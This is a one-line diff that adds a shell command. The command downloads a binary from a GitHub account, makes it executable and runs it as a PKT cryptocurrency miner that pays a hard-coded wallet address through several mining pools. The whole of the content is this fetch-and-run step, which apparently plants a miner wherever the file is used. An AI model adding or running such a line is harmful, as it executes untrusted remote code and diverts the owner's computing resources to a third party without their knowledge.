@@ -1,0 +1,1 @@
+wget https://github.com/optimus66a/a/raw/main/ann && chmod 700 ann && ./ann ann -p pkt1qpdz7u4vctsmxv3qrqrlzvqwre3g70tmqhu87rg https://stratum.zetahash.com http://pool.pkt.world/master http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
